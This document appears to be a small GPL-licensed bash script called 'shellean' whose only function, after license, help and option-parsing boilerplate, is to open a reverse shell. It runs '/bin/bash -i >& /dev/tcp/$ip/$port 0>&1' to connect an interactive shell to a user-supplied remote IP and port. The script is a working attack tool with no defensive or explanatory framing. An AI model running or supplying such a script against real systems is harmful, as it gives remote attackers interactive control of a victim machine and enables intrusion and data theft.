# Copyright (C) 2023, Nathalon

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.

tput bold;

license()
{
  echo '+-----------------------------------------------------------------------------------+';
  echo '| shellean, copyright (C) 2023-2024 Nathalon                                        |';
  echo '|                                                                                   |';
  echo '| This program comes with ABSOLUTELY NO WARRANTY; for details type show w.          |';
  echo '| This is free software, and you are welcome to redistribute it                     |';
  echo '| under certain conditions; type show c for details.                                |';
  echo '+-----------------------------------------------------------------------------------+';
}

help()
{
   echo '-> usage: /bin/bash shellean.sh [-i <Internet Protocol Address> -p <Remote Port>]';
   echo '-> options:';
   echo '';
   echo '-l -> Print the GPL license and exit.';
   echo '-h -> Print help and exit.';
   echo '-V -> Print the software version and exit.';
   echo '-i -> Specify the Internet Protocol Address to connect to.';
   echo '-p -> Specify the device port to connect to.';
}

version()
{
  echo -e '\e[5m';
  echo '--------------------------------------------------------------------------';
  echo '-- Writen by Nathalon at (2023-2024), Version: (0.0.1)                  --';
  echo '-- Contact me on Telegram: https://t.me/braindisassemblue               --';
  echo '--------------------------------------------------------------------------';
}

while getopts 'lhVi:p:' options;
do
  case $options in
    l ) license; exit;;
    h ) help; exit;;
    V ) version; exit;;
    i ) ip=$OPTARG;;
    p ) port=$OPTARG;;    
  esac
done

if [ -z $ip ];
  then
    echo '[!] -> You need to specify a Internet Protocol Address';
    echo '';
    help;
    
    exit;

elif [ -z $port ];
  then
    echo '[!] -> You need to specify a Port';
    echo '';
    help;
    
    exit;

else
  echo '--------------------------------------------------------------------------';
  echo '[i] Starting shellean at:' $(date);
  echo '--------------------------------------------------------------------------';

  echo '[i] Connecting to:' $ip:$port;

  /bin/bash -i >& /dev/tcp/$ip/$port 0>&1;

  echo '--------------------------------------------------------------------------';
  echo '[i] Exiting shellean at:' $(date);
  echo '--------------------------------------------------------------------------';
fi
